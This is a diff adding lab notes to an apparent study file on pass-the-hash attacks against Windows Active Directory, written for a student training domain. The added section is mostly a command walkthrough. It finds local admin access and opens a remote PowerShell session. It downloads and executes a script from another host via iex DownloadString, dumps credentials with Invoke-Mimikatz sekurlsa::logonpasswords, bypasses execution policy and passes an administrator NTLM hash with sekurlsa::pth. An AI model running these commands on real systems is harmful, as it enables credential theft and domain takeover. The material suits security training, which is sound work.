@@ -131,5 +131,37 @@ How do attackers typically obtain hashed credentials for pass-the-hash attacks i
 
 Which Mimikatz command is used to extract password hashes from memory for pass-the-hash attacks? > "sekurlsa::logonpasswords"
 
+Student user has admin access on that system.
+
+C:> find-localadminaccess
+seclogs.research.SECURITY.local
+
+Powershell remote control to that system
+
+C:> Enter-Pssession seclogs.research.Security.local
+[seclogs.research.Security.local]: PS C:\Users\student\Documents> whoami
+research/student
+
+Host the web-server with hfs.exe
+
+Download files from web-server
+------------------------------
+[seclogs.research.Security.local]: PS C:\> iex (New-Object Net.Webclient).Downloadstring('http://10.0.5.101/Invoke-Manipulation.ps1')
+
+To list all available tokens
+-----------------------------
+[seclogs.research.Security.local]: PS C:\> Invoke-Manipulation -Enumerate
+
+To get administrator NTLM hash
+------------------------------
+[seclogs.research.Security.local]: PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
+
+To use administrator's NTLM hash and get administrative access
+---------------------------------------------------------------
+C:\> powershell -ep bypass
+C:\> . .\Invoke-Mimikatz.ps1
+C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:842750294802902c23u2i /run:powershell.exe"'
+
+
 
 
